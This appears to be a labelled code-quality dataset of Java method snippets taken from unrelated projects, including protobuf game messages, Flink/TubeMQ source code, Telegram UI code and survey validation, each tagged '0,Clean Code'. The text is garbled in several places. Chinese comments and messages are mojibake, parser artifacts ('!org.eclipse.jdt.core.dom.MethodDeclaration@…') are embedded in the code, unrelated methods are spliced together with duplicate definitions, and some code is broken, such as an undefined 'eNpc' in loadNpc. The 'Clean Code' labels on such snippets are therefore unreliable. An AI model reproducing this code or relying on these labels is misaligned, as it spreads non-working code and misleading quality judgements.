      if (!(consumeResult.getErrCode() == 400 || consumeResult.getErrCode() == 404 || consumeResult.getErrCode() == 405 || consumeResult.getErrCode() == 406 || consumeResult.getErrCode() == 407 || consumeResult.getErrCode() == 408)) {
        LOG.info(""Could not consume messages from tubemq (errcode: {}, "" + ""errmsg: {})."",consumeResult.getErrCode(),consumeResult.getErrMsg());
      }
      Duration idleTime=Duration.between(lastConsumeInstant,Instant.now());
      if (idleTime.compareTo(maxIdleTime) > 0) {
        ctx.markAsTemporarilyIdle();
      }
      continue;
    }
    List<Message> messageList=consumeResult.getMessageList();
    List<T> records=new ArrayList<>();
    if (messageList != null) {
      lastConsumeInstant=Instant.now();
      for (      Message message : messageList) {
        T record=deserializationSchema.deserialize(message.getData());
        records.add(record);
      }
    }
synchronized (ctx.getCheckpointLock()) {
      for (      T record : records) {
        ctx.collect(record);
      }
      currentOffsets.put(consumeResult.getPartitionKey(),consumeResult.getCurrOffset());
    }
    ConsumerResult confirmResult=messagePullConsumer.confirmConsume(consumeResult.getConfirmContext(),true);
    if (!confirmResult.isSuccess()) {
      if (!(confirmResult.getErrCode() == 400 || confirmResult.getErrCode() == 404 || confirmResult.getErrCode() == 405 || confirmResult.getErrCode() == 406 || confirmResult.getErrCode() == 407 || confirmResult.getErrCode() == 408)) {
        LOG.warn(""Could not confirm messages to tubemq (errcode: {}, "" + ""errmsg: {})."",confirmResult.getErrCode(),confirmResult.getErrMsg());
      }
    }
  }
}",0,Clean Code
"public int getPerLoadingMaterialType(){
  return this.perLoadingMaterialType;
}
",0,Clean Code
"public static EnhanceRogueBuffCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),data).checkInitialized();
}
public static EnhanceRogueBuffCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),input).checkInitialized();
}
public static EnhanceRogueBuffCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 绛旀鏍￠獙
 * @param project
 * @param request
 */
private void validateAnswer(ProjectView project,AnswerRequest request){
  List<SurveySchema> uniqueSchemaList=SchemaHelper.findSchemaListByAttribute(project.getSurvey(),""unique"",true);
  SchemaHelper.TreeNode treeNode=SchemaHelper.SurveySchema2TreeNode(project.getSurvey());
  uniqueSchemaList.forEach(optionSchema -> {
    String questionId=treeNode.getTreeNodeMap().get(optionSchema.getId()).getParent().getData().getId();
    Object questionValue=request.getAnswer().get(questionId);
    if (questionValue == null) {
      return;
    }
    String uniqueQuery=String.format(""\""%s\"":"",optionSchema.getId());
    if (SurveySchema.DataType.number == optionSchema.getAttribute().getDataType()) {
      uniqueQuery+=((Map)questionValue).get(optionSchema.getId());
    }
 else {
      uniqueQuery+=""\"""" + ((Map)questionValue).get(optionSchema.getId()) + ""\"""";
    }
    AnswerQuery query=new AnswerQuery();
    query.setProjectId(project.getId());
    query.setValueQuery(uniqueQuery);
    if (answerService.count(query) > 0) {
      String uniqueText=optionSchema.getAttribute().getUniqueText();
      throw new ValidationException(isNotBlank(uniqueText) ? uniqueText : ""闂嵎閲嶅淇濆瓨"");
    }
  }
);
  List<SurveySchema> hasQuotaSchemaList=SchemaHelper.findSchemaHasAttribute(project.getSurvey(),""quota"");
  if (hasQuotaSchemaList.size() > 0) {
    ProjectQuery query=new ProjectQuery();
    query.setId(request.getProjectId());
    PublicStatisticsView statisticsView=statProject(query);
    hasQuotaSchemaList.forEach(optionSchema -> {
      String questionId=treeNode.getTreeNodeMap().get(optionSchema.getId()).getParent().getData().getId();
      Object questionValue=request.getAnswer().get(questionId);
      if (questionValue == null) {
        return;
      }
      boolean optionNotChecked=((Map)questionValue).get(optionSchema.getId()) == null;
      if (optionNotChecked) {
        return;
      }
      PublicStatisticsView.QuestionStatistics questionStatistics=statisticsView.getQuestionStatistics().get(questionId);
      int optionSelectedCount=questionStatistics.getOptionStatistics().stream().filter(x -> x.getOptionId().equals(optionSchema.getId())).findFirst().orElse(new PublicStatisticsView.OptionStatistics()).getCount();
      Integer quota=optionSchema.getAttribute().getQuota();
      if (quota != null && optionSelectedCount + 1 > quota) {
        throw new ValidationException(""閫夐」鏁伴噺瓒呰繃闄愬埗锛岃閲嶆柊閫夋嫨"");
      }
    }
);
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SearchPlayerCsReq)) {
    return false;
  }
  SearchPlayerCsReq other=(SearchPlayerCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasSearchUidList() || searchUidList.equals(other.searchUidList));
}",0,Clean Code
"@Override public void onClick(View v){
switch (v.getId()) {
case android.R.id.button1:
{
      if (mOnCheckedListener != null && mAdapter != null) {
        mOnCheckedListener.onChecked(mAdapter.getCheckedArray());
      }
    }
case android.R.id.button2:
{
    if (mData != null) {
      if (curWillCheckAll) {
        selectAll();
      }
 else {
        reverseSelect();
      }
      ((Button)v).setText(curWillCheckAll ? getResources().getString(R.string.miuix_appcompat_action_mode_inverse) : getResources().getString(R.string.miuix_appcompat_action_mode_select_all));
      curWillCheckAll=!curWillCheckAll;
    }
  }
}
}",0,Clean Code
"List<IGProIdentityInfo> getIdentityList();
",0,Clean Code
"private void buildParameter(PreparedStatement preparedStatement,Object parameter,Map<Integer,String> parameterMap) throws SQLException, IllegalAccessException {
  int size=parameterMap.size();
  if (parameter instanceof Long) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setLong(i,Long.parseLong(parameter.toString()));
    }
    return;
  }
  if (parameter instanceof Integer) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setInt(i,Integer.parseInt(parameter.toString()));
    }
    return;
  }
  if (parameter instanceof String) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setString(i,parameter.toString());
    }
    return;
  }
  Map<String,Object> fieldMap=new HashMap<>();
  Field[] declaredFields=parameter.getClass().getDeclaredFields();
  for (  Field field : declaredFields) {
    String name=field.getName();
    field.setAccessible(true);
    Object obj=field.get(parameter);
    field.setAccessible(false);
    fieldMap.put(name,obj);
  }
  for (int i=1; i <= size; i++) {
    String parameterDefine=parameterMap.get(i);
    Object obj=fieldMap.get(parameterDefine);
    if (obj instanceof Short) {
      preparedStatement.setShort(i,Short.parseShort(obj.toString()));
      continue;
    }
    if (obj instanceof Integer) {
      preparedStatement.setInt(i,Integer.parseInt(obj.toString()));
      continue;
    }
    if (obj instanceof Long) {
      preparedStatement.setLong(i,Long.parseLong(obj.toString()));
      continue;
    }
    if (obj instanceof String) {
      preparedStatement.setString(i,obj.toString());
      continue;
    }
    if (obj instanceof Date) {
      preparedStatement.setDate(i,(java.sql.Date)obj);
    }
  }
}",0,Clean Code
"/** 
 * 鏌ヨ鍙傛暟閰嶇疆淇℃伅
 * @param config 鍙傛暟閰嶇疆淇℃伅
 * @return 鍙傛暟閰嶇疆淇℃伅
 */
default SysConfigEntity selectConfig(SysConfigEntity config){
  return selectOne(new LambdaQueryWrapperX<SysConfigEntity>().eq(ObjectUtil.isNotEmpty(config.getConfigId()),SysConfigEntity::getConfigId,config.getConfigId()).eq(ObjectUtil.isNotEmpty(config.getConfigName()),SysConfigEntity::getConfigName,config.getConfigName()).eq(ObjectUtil.isNotEmpty(config.getConfigKey()),SysConfigEntity::getConfigKey,config.getConfigKey()));
}
",0,Clean Code
"public XzException400HTTP(String message){
  super(RCode.BAD_REQUEST.getCode(),message);
}",0,Clean Code
"IGProRoleManagementTag getRoleManagementTag();
",0,Clean Code
"/** 
 * @return the value
 */
public ConstValue getValue(){
  return value;
}
",0,Clean Code
"@ParameterizedTest @MethodSource(""contentRetrieverProviders"") void should_answer_query_2(Function<DataSource,ContentRetriever> contentRetrieverProvider){
  ContentRetriever contentRetriever=contentRetrieverProvider.apply(dataSource);
  List<Content> retrieved=contentRetriever.retrieve(Query.from(""What is the total sales in dollars for each product?""));
  assertThat(retrieved).hasSize(1);
  assertThat(retrieved.get(0).textSegment().text()).contains(""SELECT"").contains(""99.98"",""71.97"",""64.95"",""22.50"",""23.97"");
}",0,Clean Code
"/** 
 * <code>optional uint32 group_id = 10;</code>
 * @param value the groupId to set
 * @return this
 */
public UnlockedMusic setGroupId(final int value){
  bitField0_|=0x00000002;
  groupId=value;
  return this;
}",0,Clean Code
"/** 
 * <code>optional .RogueRecordInfo record_info = 5;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableRecordInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public RogueRecordInfoOuterClass.RogueRecordInfo getRecordInfo(){
  return recordInfo;
}",0,Clean Code
"@Override public void employeeChangeRecords(Long companyId){
}
",0,Clean Code
"/** 
 * SSO-Server绔細鎺堟潈鍦板潃
 * @return 澶勭悊缁撴灉
 */
public Object ssoAuth(){
  SaRequest req=SaHolder.getRequest();
  SaResponse res=SaHolder.getResponse();
  SaSsoServerConfig cfg=ssoServerTemplate.getServerConfig();
  StpLogic stpLogic=ssoServerTemplate.getStpLogic();
  ParamName paramName=ssoServerTemplate.paramName;
  if (!stpLogic.isLogin()) {
    return cfg.notLoginView.get();
  }
  String mode=req.getParam(paramName.mode,"""");
  String redirect=req.getParam(paramName.redirect);
  if (mode.equals(SaSsoConsts.MODE_SIMPLE)) {
    if (SaFoxUtil.isEmpty(redirect)) {
      if (SaFoxUtil.isEmpty(cfg.getHomeRoute())) {
        throw new SaSsoException(""鏈寚瀹� redirect 鍙傛暟锛屼篃鏈厤缃� homeRoute 璺敱锛屾棤娉曞畬鎴愰噸瀹氬悜鎿嶄綔"").setCode(SaSsoErrorCode.CODE_30014);
      }
      return res.redirect(cfg.getHomeRoute());
    }
    ssoServerTemplate.checkRedirectUrl(redirect);
    return res.redirect(redirect);
  }
 else {
    String client=req.getParam(paramName.client);
    if (SaSsoConsts.CLIENT_WILDCARD.equals(client)) {
      throw new SaSsoException(""鏃犳晥 client 鏍囪瘑锛�"" + client).setCode(SaSsoErrorCode.CODE_30013);
    }
    if (SaFoxUtil.isEmpty(redirect)) {
      if (SaFoxUtil.isEmpty(cfg.getHomeRoute())) {
        throw new SaSsoException(""鏈寚瀹� redirect 鍙傛暟锛屼篃鏈厤缃� homeRoute 璺敱锛屾棤娉曞畬鎴愰噸瀹氬悜鎿嶄綔"").setCode(SaSsoErrorCode.CODE_30014);
      }
      return res.redirect(cfg.getHomeRoute());
    }
    String redirectUrl=ssoServerTemplate.buildRedirectUrl(stpLogic.getLoginId(),client,redirect);
    if (cfg.getAutoRenewTimeout()) {
      stpLogic.renewTimeout(stpLogic.getConfigOrGlobal().getTimeout());
    }
    return res.redirect(redirectUrl);
  }
}",0,Clean Code
"long getStateType();
",0,Clean Code
"public static void scale(VectorFloat<?> vector,float multiplier){
  impl.scale(vector,multiplier);
}
",0,Clean Code
"public Object longsCopyUnaligned(MemoryState state){
  state.heapBuffer.writerIndex(0);
  state.heapBuffer.writeBoolean(false);
  state.heapBuffer.writePrimitiveArrayWithSize(state.longs,Platform.LONG_ARRAY_OFFSET,state.longs.length * 8);
  return state.heapBuffer;
}",0,Clean Code
"@Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
  ApplicationContextUtil.applicationContext=applicationContext;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(baseAvatarId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(equipAvatarId);
  }
  return size;
}",0,Clean Code
"/** 
 * <code>repeated .RogueHandbookEvent rogue_event = 12;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableRogueEvent()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RogueHandbookEventOuterClass.RogueHandbookEvent> getRogueEvent(){
  return rogueEvent;
}",0,Clean Code
"@Override public TakeOffEquipmentCsReq copyFrom(final TakeOffEquipmentCsReq other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    baseAvatarId=other.baseAvatarId;
    equipAvatarId=other.equipAvatarId;
  }
  return this;
}",0,Clean Code
"private LibLinearModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private LibLinearModelProto(){
  models_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@d117bdc",0,Clean Code
"public void setBinExportPath(final String path,final ESide side){
  if (side == ESide.PRIMARY) {
    primaryBinExport=path;
  }
 else {
    secondaryBinExport=path;
  }
}
",0,Clean Code
"@Override public HeroBasicTypeInfo create(){
  return HeroBasicTypeInfo.newInstance();
}
",0,Clean Code
"/** 
 * @return the updateTime
 */
public String getUpdateTime(){
  return updateTime;
}
",0,Clean Code
"public void release(){
  Log.d(TAG,""release"");
  INSTANCE_CACHE=null;
  if (mImageAcquireLooper != null) {
    mImageAcquireLooper.quit();
  }
  if (mMediaProjection != null) {
    mMediaProjection.stop();
  }
  if (mVirtualDisplay != null) {
    mVirtualDisplay.release();
  }
  if (mImageReader != null) {
    mImageReader.close();
  }
  if (mUnderUsingImage != null) {
    mUnderUsingImage.close();
  }
  Image cachedImage=mCachedImage.getAndSet(null);
  if (cachedImage != null) {
    cachedImage.close();
  }
  if (mOrientationEventListener != null) {
    mOrientationEventListener.disable();
  }
  ScreenCapturerForegroundService.stop(mContext);
}
public void release(ScriptRuntime scriptRuntime){
  removeScriptRuntimeIfNeeded(scriptRuntime);
  if (mScriptRuntimes.isEmpty()) {
    release();
  }
}
",0,Clean Code
"/** 
 * <code>optional int64 modify_time = 14;</code>
 * @return the modifyTime
 */
public long getModifyTime(){
  return modifyTime;
}",0,Clean Code
"@Override public boolean success(){
  return success;
}
@Override public void success(boolean success){
  this.success=success;
}
",0,Clean Code
"/** 
 * See the general contract of the <code>readUTF</code> method of <code>DataInput</code>. <p> Bytes for this operation are read from the contained input stream.
 * @return     a Unicode string.
 * @exception EOFException  if this input stream reaches the end beforereading all the bytes.
 * @exception IOException   the stream has been closed and the containedinput stream does not support reading after close, or another I/O error occurs.
 * @exception UTFDataFormatException if the bytes do not represent a validmodified UTF-8 encoding of a string.
 * @see java.io.DataInputStream#readUTF(java.io.DataInput)
 */
public final String readUTF() throws IOException {
  return readUTF(this);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4a7fd0c9",0,Clean Code
"@Test public void getWorkflows(){
  Workflow workflow=new Workflow();
  workflow.setCorrelationId(""123"");
  ArrayList<Workflow> listOfWorkflows=new ArrayList<>(){
{
      add(workflow);
    }
  }
;
  when(mockWorkflowService.getWorkflows(anyString(),anyString(),anyBoolean(),anyBoolean())).thenReturn(listOfWorkflows);
  assertEquals(listOfWorkflows,workflowResource.getWorkflows(""test1"",""123"",true,true));
}",0,Clean Code
"@Test public void testIndexExistingTask() throws SQLException {
  TaskSummary ts=getMockTaskSummary(""task-id"");
  indexDAO.indexTask(ts);
  compareTaskSummary(ts);
  ts.setStatus(Task.Status.FAILED);
  indexDAO.indexTask(ts);
  compareTaskSummary(ts);
}
",0,Clean Code
"@Override public String getGuildId(){
  return this.mInfo.getGuildId();
}
",0,Clean Code
"@Override public Object executeGeneric(VirtualFrame frame){
  return evaluateCondition(frame) ? thenNode.executeGeneric(frame) : elseNode.executeGeneric(frame);
}
",0,Clean Code
"private static List<String> extractListInputParam(String key,List<?> values,String taskName,WorkflowDef workflow){
  ArrayList<String> errorList=new ArrayList<>();
  for (  Object listVal : values) {
    if (listVal instanceof String) {
      errorList.addAll(extractParamPathComponentsFromString(key,listVal.toString(),taskName,workflow));
    }
 else     if (listVal instanceof Map) {
      errorList.addAll(validateInputParam((Map<String,Object>)listVal,taskName,workflow));
    }
 else     if (listVal instanceof List) {
      errorList.addAll(extractListInputParam(key,(List<?>)listVal,taskName,workflow));
    }
  }
  return errorList;
}
",0,Clean Code
"void onResult(int i2,String str,VideoPlayUrlResult videoPlayUrlResult);",0,Clean Code
"public List<PollData> getTaskPollData(String taskName){
  return pollDataDAO.getPollData(taskName);
}
",0,Clean Code
"/** 
 * <code>optional .ChessRogueMiracleData miracle_data = 13;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableMiracleData()} if you want to modify it.
 * @return internal storage object for reading
 */
public ChessRogueMiracleDataOuterClass.ChessRogueMiracleData getMiracleData(){
  return miracleData;
}",0,Clean Code
"void regenerate();
",0,Clean Code
"public String get(String key){
  return parent + ""."" + key+ ""}"";
}
public String get(String key,int index){
  return parent + ""."" + key+ ""[""+ index+ ""]}"";
}
public String get(int index){
  return parent + ""["" + index+ ""]}"";
}
public String get(String key){
  return ""${"" + name + "".""+ field+ "".""+ key+ ""}"";
}
",0,Clean Code
"public void processUpdate(ConnectionUpdate update){
  if ((update.update_type & ConnectionUpdate.UPDATE_STATS) != 0) {
    sent_bytes=update.sent_bytes;
    rcvd_bytes=update.rcvd_bytes;
    sent_pkts=update.sent_pkts;
    rcvd_pkts=update.rcvd_pkts;
    blocked_pkts=update.blocked_pkts;
    status=(update.status & 0x00FF);
    port_mapping_applied=(update.status & 0x2000) != 0;
    decryption_ignored=(update.status & 0x1000) != 0;
    netd_block_missed=(update.status & 0x0800) != 0;
    is_blocked=(update.status & 0x0400) != 0;
    blacklisted_host=(update.status & 0x0200) != 0;
    blacklisted_ip=(update.status & 0x0100) != 0;
    last_seen=update.last_seen;
    tcp_flags=update.tcp_flags;
    if ((status == ConnectionDescriptor.CONN_STATUS_CLOSED) && (decryption_error != null))     status=ConnectionDescriptor.CONN_STATUS_CLIENT_ERROR;
    if (!mitm_decrypt)     payload_length=update.payload_length;
  }
  if ((update.update_type & ConnectionUpdate.UPDATE_INFO) != 0) {
    info=update.info;
    url=update.url;
    l7proto=update.l7proto;
    encrypted_l7=((update.info_flags & ConnectionUpdate.UPDATE_INFO_FLAG_ENCRYPTED_L7) != 0);
  }
  if ((update.update_type & ConnectionUpdate.UPDATE_PAYLOAD) != 0) {
    assert (decryption_ignored || isNotDecryptable());
    if (!CaptureService.isLowMemory()) {
synchronized (this) {
        if (update.payload_chunks != null)         payload_chunks.addAll(update.payload_chunks);
        payload_truncated=update.payload_truncated;
      }
    }
  }
}",0,Clean Code
"@Override public BattleEquipment create(){
  return BattleEquipment.newInstance();
}
",0,Clean Code
"@Override public Long setnx(final String key,final String value){
  try {
    return redis.setnx(key,value);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}
",0,Clean Code
"@Override public boolean success(){
  return success;
}
@Override public void success(boolean success){
  this.success=success;
}
",0,Clean Code
"@Override protected void process(String line){
  GCLogTrace trace=null;
  try {
    if ((trace=UNIFIED_LOGGING_APPLICATION_STOP_TIME_WITH_STOPPING_TIME.parse(line)) != null) {
      if (safePointReason != null)       publish(new ApplicationStoppedTime(timeStamp,trace.getDoubleGroup(1),trace.getDoubleGroup(2),safePointReason));
 else       publish(new ApplicationStoppedTime(timeStamp,trace.getDoubleGroup(1),trace.getDoubleGroup(2),gcPause));
      safePointReason=null;
      gcPause=false;
    }
 else     if (GC_PAUSE_CLAUSE.parse(line) != null) {
      gcPause=true;
    }
 else     if ((trace=SAFEPOINT_REGION.parse(line)) != null) {
      timeStamp=getClock();
      safePointReason=ApplicationStoppedTime.VMOperations.valueOf(trace.getGroup(1));
    }
 else     if ((trace=LEAVING_SAFEPOINT.parse(line)) != null) {
    }
 else     if ((trace=UNIFIED_LOGGING_APPLICATION_TIME.parse(line)) != null) {
      publish(new ApplicationConcurrentTime(getClock(),trace.getDoubleGroup(1)));
    }
 else     if (line.equals(END_OF_DATA_SENTINEL) || (JVM_EXIT.parse(line) != null)) {
      publish(new JVMTermination(getClock(),diary.getTimeOfFirstEvent()));
    }
 else     if (getClock().getTimeStamp() > timeStamp.getTimeStamp()) {
      if (isGCPause(line))       gcPause=true;
      timeStamp=getClock();
    }
  }
 catch (  Throwable t) {
    LOGGER.log(Level.FINE,""Missed: {0}"",line);
  }
}",0,Clean Code
"public void setCollectionName(String collectionName){
  this.collectionName=collectionName;
}
",0,Clean Code
"public int getGotFreeGiftNum(){
  return this.gotFreeGiftNum;
}
",0,Clean Code
"public EntityNpc loadNpc(Scene scene,GroupInfo group,NpcInfo npcInfo){
  if (npcInfo.isIsDelete() || npcInfo.isIsClientOnly()) {
    return null;
  }
  if (!GameData.getNpcExcelMap().containsKey(npcInfo.getNPCID())) {
    return null;
  }
  boolean hasDuplicateNpcId=false;
  for (  GameEntity entity : scene.getEntities().values()) {
    if (entity instanceof EntityNpc && eNpc.getNpcId() == npcInfo.getNPCID()) {
      hasDuplicateNpcId=true;
      break;
    }
  }
  if (hasDuplicateNpcId)   return null;
  return new EntityNpc(scene,group,npcInfo);
}
",0,Clean Code
"@Override public IAddress getIAddress(final ESide side){
  return new CAddress(getAddress(side));
}
",0,Clean Code
"private void check(){
  Preconditions.checkArgument(!type.isArray(),""Please use "" + NewArray.class + "" to create array."");
  if (unknownClassName == null && !arguments.isEmpty()) {
    boolean anyMatchParamCount=Stream.of(getRawType(type).getConstructors()).anyMatch(c -> c.getParameterCount() == arguments.size());
    if (!anyMatchParamCount) {
      String msg=String.format(""%s doesn't have a public constructor that take %d params"",type,arguments.size());
      throw new IllegalArgumentException(msg);
    }
  }
  checkArgument(rawType.getCanonicalName() != null,""Local/Anonymous type %s isn't supported."",type);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(groupId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * takenRewardList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(takenRewardList);
  }
  return size;
}",0,Clean Code
"public VectorSchemaRoot finish(){
  Arrays.stream(fieldWriters).forEach(ArrowArrayWriter::finish);
  root.setRowCount(rowCount);
  return root;
}
",0,Clean Code
"private void submitOption(CharSequence optionText,byte[] option){
  TLRPC.TL_channels_reportSponsoredMessage req=new TLRPC.TL_channels_reportSponsoredMessage();
  req.channel=MessagesController.getInputChannel(chat);
  req.random_id=messageObject.sponsoredId;
  req.option=option;
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    AndroidUtilities.runOnUIThread(() -> {
      if (response != null) {
        if (response instanceof TLRPC.TL_channels_sponsoredMessageReportResultChooseOption) {
          TLRPC.TL_channels_sponsoredMessageReportResultChooseOption result=(TLRPC.TL_channels_sponsoredMessageReportResultChooseOption)response;
          int nextPosition=viewPager.currentPosition + 1;
          viewPager.scrollToPosition(nextPosition);
          Page nextPage=(Page)viewPager.getViewPages()[1];
          if (nextPage != null) {
            nextPage.setOption(result);
            if (optionText != null) {
              nextPage.setHeaderText(optionText);
            }
          }
        }
 else         if (response instanceof TLRPC.TL_channels_sponsoredMessageReportResultAdsHidden) {
          MessagesController.getInstance(currentAccount).disableAds(false);
          if (listener != null) {
            listener.onHidden();
            dismiss();
          }
        }
 else         if (response instanceof TLRPC.TL_channels_sponsoredMessageReportResultReported) {
          if (listener != null) {
            listener.onReported();
            dismiss();
          }
        }
      }
 else       if (error != null) {
        if (""PREMIUM_ACCOUNT_REQUIRED"".equals(error.text)) {
          if (listener != null) {
            listener.onPremiumRequired();
          }
        }
 else         if (""AD_EXPIRED"".equals(error.text)) {
          if (listener != null) {
            listener.onReported();
          }
        }
        dismiss();
      }
    }
);
  }
);
}",0,Clean Code
"/** 
 * Return a View with which to navigate the graph.  Views are not threadsafe -- that is, only one search at a time should be run per View. <p> Additionally, the View represents a point of consistency in the graph, and in-use Views prevent the removal of marked-deleted nodes from graphs that are being concurrently modified.  Thus, it is good (and encouraged) to re-use Views for on-disk, read-only graphs, but for in-memory graphs, it is better to create a new View per search.
 */
View getView();
",0,Clean Code
"public void updateColors(){
  updateColors(false);
}
public void updateColors(boolean applyDescriptions){
  adapter.updateColors();
  titleTextView.setHighlightColor(getThemedColor(Theme.key_dialogLinkSelection));
  stickerPreviewLayout.setBackgroundColor(getThemedColor(Theme.key_dialogBackground) & 0xdfffffff);
  optionsButton.setIconColor(getThemedColor(Theme.key_sheet_other));
  optionsButton.setPopupItemsColor(getThemedColor(Theme.key_actionBarDefaultSubmenuItem),false);
  optionsButton.setPopupItemsColor(getThemedColor(Theme.key_actionBarDefaultSubmenuItemIcon),true);
  optionsButton.setPopupItemsSelectorColor(getThemedColor(Theme.key_dialogButtonSelector));
  optionsButton.redrawPopup(getThemedColor(Theme.key_actionBarDefaultSubmenuBackground));
  if (deleteItem != null) {
    int redColor=getThemedColor(Theme.key_text_RedBold);
    deleteItem.setColors(redColor,redColor);
    deleteItem.setSelectorColor(Theme.multAlpha(redColor,.1f));
    if (deleteItem.getRightIcon() != null) {
      deleteItem.getRightIcon().setColorFilter(redColor);
    }
  }
  if (applyDescriptions) {
    if (Theme.isAnimatingColor() && animatingDescriptions == null) {
      animatingDescriptions=getThemeDescriptions();
      for (int i=0, N=animatingDescriptions.size(); i < N; i++) {
        animatingDescriptions.get(i).setDelegateDisabled();
      }
    }
    for (int i=0, N=animatingDescriptions.size(); i < N; i++) {
      final ThemeDescription description=animatingDescriptions.get(i);
      description.setColor(getThemedColor(description.getCurrentKey()),false,false);
    }
  }
  if (!Theme.isAnimatingColor() && animatingDescriptions != null) {
    animatingDescriptions=null;
  }
}
public void updateColors(){
  if (stickerSetCovereds != null) {
    for (int i=0, size=gridView.getChildCount(); i < size; i++) {
      final View child=gridView.getChildAt(i);
      if (child instanceof FeaturedStickerSetInfoCell) {
        ((FeaturedStickerSetInfoCell)child).updateColors();
      }
    }
  }
}",0,Clean Code
"@Override public void onChange(Uri uri){
  try {
    String type=uri.getPathSegments().get(1);
    String key=uri.getPathSegments().get(2);
    if (!key.contains(""pref_key_system_framework_clean_open_apps""))     return;
switch (type) {
case ""stringset"":
      ;
case ""integer"":
    ;
}
}
 catch (Throwable t) {
logE(TAG,CleanOpenMenu.this.lpparam.packageName,t);
}
}",0,Clean Code
"@Override protected void doExpression(Expression expression,StringBuilder context){
  if (expression.type() == Filter.ExpressionType.NIN) {
    this.doNot(new Expression(Filter.ExpressionType.NOT,new Expression(Filter.ExpressionType.IN,expression.left(),expression.right())),context);
  }
 else {
    this.convertOperand(expression.left(),context);
    context.append(this.getOperationSymbol(expression));
    this.convertOperand(expression.right(),context);
  }
}
",0,Clean Code
"@Override public EnterSceneCsReq mergeFrom(final EnterSceneCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasEntryId()) {
    setEntryId(other.entryId);
  }
  if (other.hasTeleportId()) {
    setTeleportId(other.teleportId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@78894d42!org.eclipse.jdt.core.dom.MethodDeclaration@561ca0a2",0,Clean Code
"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
switch (getItemViewType(position)) {
case TYPE_INFO:
    TextInfoPrivacyCell infoCell=(TextInfoPrivacyCell)holder.itemView;
  infoCell.setTextColor(Theme.getColor(Theme.key_windowBackgroundWhiteGrayText4));
if (isChannel) {
  infoCell.setText(ChatObject.isChannelAndNotMegaGroup(currentChat) ? LocaleController.getString(""EnableReactionsChannelInfo"",R.string.EnableReactionsChannelInfo) : LocaleController.getString(""EnableReactionsGroupInfo"",R.string.EnableReactionsGroupInfo));
}
 else {
  infoCell.setForeground(Theme.getThemedDrawableByKey(getContext(),R.drawable.greydivider_bottom,Theme.key_windowBackgroundGrayShadow));
  if (selectedType == SELECT_TYPE_SOME) {
    infoCell.setText(LocaleController.getString(""EnableSomeReactionsInfo"",R.string.EnableSomeReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_ALL) {
    infoCell.setText(LocaleController.getString(""EnableAllReactionsInfo"",R.string.EnableAllReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_NONE) {
    infoCell.setText(LocaleController.getString(""DisableReactionsInfo"",R.string.DisableReactionsInfo));
  }
}
break;
case TYPE_HEADER:
HeaderCell headerCell=(HeaderCell)holder.itemView;
headerCell.setText(LocaleController.getString(""OnlyAllowThisReactions"",R.string.OnlyAllowThisReactions));
headerCell.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
break;
case TYPE_REACTION:
AvailableReactionCell reactionCell=(AvailableReactionCell)holder.itemView;
TLRPC.TL_availableReaction react=availableReactions.get(position - (isChannel ? 2 : 3));
reactionCell.bind(react,chatReactions.contains(react.reaction),currentAccount);
break;
}
}",0,Clean Code
"private static void removeKey(List<String> keys,Object data){
  if (CollectionUtils.isEmpty(keys) || data == null) {
    return;
  }
  if (data instanceof Collection) {
    for (    Object object : (Collection)data) {
      removeKey(keys,object);
    }
    return;
  }
  if (data.getClass().isArray()) {
    Object[] objects=transferArray(data);
    for (    Object object : objects) {
      removeKey(keys,object);
    }
    return;
  }
  if (!(data instanceof Map)) {
    return;
  }
  Map<String,Object> mapData=(Map<String,Object>)data;
  Iterator<Map.Entry<String,Object>> it=mapData.entrySet().iterator();
  while (it.hasNext()) {
    Map.Entry<String,Object> entry=it.next();
    if (keys.contains(entry.getKey())) {
      it.remove();
      continue;
    }
    removeKey(keys,entry.getValue());
  }
}
",0,Clean Code
"/** 
 * 寮傛鎵ц寮傚父澶勭悊
 */
@Override public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler(){
  return (throwable,method,objects) -> {
    throwable.printStackTrace();
